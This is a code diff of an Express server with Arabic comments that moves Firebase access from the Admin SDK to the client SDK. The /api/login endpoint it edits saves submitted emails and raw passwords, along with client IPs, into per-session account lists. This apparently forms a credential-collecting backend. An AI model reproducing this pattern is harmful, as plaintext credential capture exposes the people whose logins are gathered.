@@ -3,7 +3,6 @@ const express = require('express');
 const path = require('path');
 const fs = require('fs');
 const bodyParser = require('body-parser');
-const admin = require('firebase-admin');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -24,15 +23,13 @@ const firebaseConfig = {
   measurementId: process.env.FIREBASE_MEASUREMENT_ID
 };
 
-// تهيئة Firebase Admin SDK
-let adminConfig = {
-  databaseURL: firebaseConfig.databaseURL
-};
+// استخدام Firebase SDK العادي
+const { initializeApp } = require('firebase/app');
+const { getDatabase, ref, set, push, serverTimestamp } = require('firebase/database');
 
-// استخدام مفتاح API العادي بدلاً من مفتاح الخدمة
-admin.initializeApp(adminConfig);
-
-const db = admin.database();
+// تهيئة Firebase
+const firebaseApp = initializeApp(firebaseConfig);
+const database = getDatabase(firebaseApp);
 
 // API لإنشاء جلسة جديدة
 app.post('/api/create-session', async (req, res) => {
@@ -44,8 +41,9 @@ app.post('/api/create-session', async (req, res) => {
     }
     
     // إنشاء جلسة جديدة في Firebase
-    await db.ref(`login/sessions/${sessionId}`).set({
-      created: admin.database.ServerValue.TIMESTAMP,
+    const sessionRef = ref(database, `login/sessions/${sessionId}`);
+    await set(sessionRef, {
+      created: serverTimestamp(),
       status: 'active',
       accounts: {}
     });
@@ -67,11 +65,12 @@ app.post('/api/login', async (req, res) => {
     }
     
     // تخزين بيانات تسجيل الدخول في Firebase
-    const newAccountRef = db.ref(`login/sessions/${sessionId}/accounts`).push();
-    await newAccountRef.set({
+    const accountsRef = ref(database, `login/sessions/${sessionId}/accounts`);
+    const newAccountRef = push(accountsRef);
+    await set(newAccountRef, {
       email,
       password,
-      timestamp: admin.database.ServerValue.TIMESTAMP,
+      timestamp: serverTimestamp(),
       ip: ip || 'غير معروف'
     });
     
